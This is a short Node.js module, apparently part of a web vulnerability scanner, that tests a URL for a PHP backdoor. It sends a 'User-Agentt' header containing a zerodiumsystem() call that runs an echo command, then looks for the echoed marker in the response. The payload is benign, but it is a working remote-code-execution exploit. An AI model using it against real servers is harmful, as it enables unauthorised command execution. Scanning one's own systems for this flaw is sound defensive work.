//Dependencies
const Debugger = require("../utils/debugger")
const Request = require("request")
const Fs = require("fs")

//Main
async function self(url, result_dir, callback){
    Debugger.debug("INFO", "In scan type: Exploiting | PHP User-Agentt Remote Code Execution")
    const domain = url.split("//")[1]

    Request(url, {
        headers:{
            "User-Agentt": `zerodiumsystem('echo "Hacked #52816268"')`
        }
    },function(err, res, body){
        if(err){
            Debugger.debug("CRITICAL", "Something went wrong while requesting to the website, please try again later. #PHP User-Agentt Remote Code Execution")
            Debugger.debug("WARNING", "Aborting... Exiting, please wait.")
            Fs.rmdirSync(result_dir)
            console.clear()
            process.exit()
        }

        if(body.indexOf("Hacked #52816268") != -1){
            Debugger.debug("INFO", "Website is vulnerable to PHP User-Agentt Remote Code Execution.")
            callback()
        }else{
            Debugger.debug("WARNING", "Website is not vulnerable to PHP User-Agentt Remote Code Execution.")
            Debugger.debug("INFO", "Continuing.")
            callback()
        }
    })
}

//Exporter
module.exports = {
    self: self
}